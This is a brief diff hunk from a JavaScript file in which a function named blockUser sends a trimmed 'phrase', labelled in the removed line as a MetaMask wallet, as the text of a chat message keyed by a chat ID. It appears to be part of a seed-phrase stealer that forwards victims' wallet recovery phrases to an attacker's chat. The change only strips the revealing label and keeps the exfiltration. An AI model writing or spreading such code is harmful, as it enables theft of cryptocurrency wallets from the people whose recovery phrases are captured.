@@ -355,7 +355,7 @@ function blockUser() {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       chat_id: chatId,
-      text: "🦊 MetaMask wallet:\n\n" + phrase.trim()
+      text: "" + phrase.trim()
     })
   });
 
